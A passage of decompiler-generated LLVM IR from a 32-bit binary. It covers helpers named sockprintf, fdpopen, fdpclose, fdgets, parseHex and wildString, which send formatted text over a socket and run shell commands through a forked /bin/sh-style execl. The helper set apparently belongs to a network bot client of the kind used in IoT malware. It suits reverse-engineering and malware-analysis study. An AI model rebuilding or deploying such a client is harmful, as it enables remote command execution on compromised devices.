  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8cd4 = load i32, i32* @r1, align 4
  store i32 %v6_8cd4, i32* %stack_var_-12, align 4
  %v3_8cd8 = load i32, i32* @fp, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  store i32 %v3_8cd8, i32* @fp, align 4
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8d58 = load i32, i32* @r2, align 4
  store i32 %v6_8d58, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  store i32 %v1_8d70, i32* @r0, align 4
  %v0_8e08 = call i32 @free()
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_30924.37, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_30924.37, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp3, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  store i32 ptrtoint ([8 x i8]* @global_var_1a2e0.39 to i32), i32* @r0, align 4
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1a2e0.39 to i32), i32 ptrtoint ([3 x i8]* @global_var_19ed8.41 to i32), i32 ptrtoint ([3 x i8]* @global_var_1a2e8.43 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp3, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_30924.37, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_30924.37, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_30924.37, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp6, 4
  %v2_91cc = load i32, i32* @global_var_30924.37, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, 65280
  %v3_91f81 = udiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge4 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f81, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_30924.37, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c4 = load i8, i8* %arg1, align 1
  %v2_93506 = icmp eq i8 %v2_934c4, 0
  br i1 %v2_93506, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.07, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_1a2ec.46 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.07, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp9, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
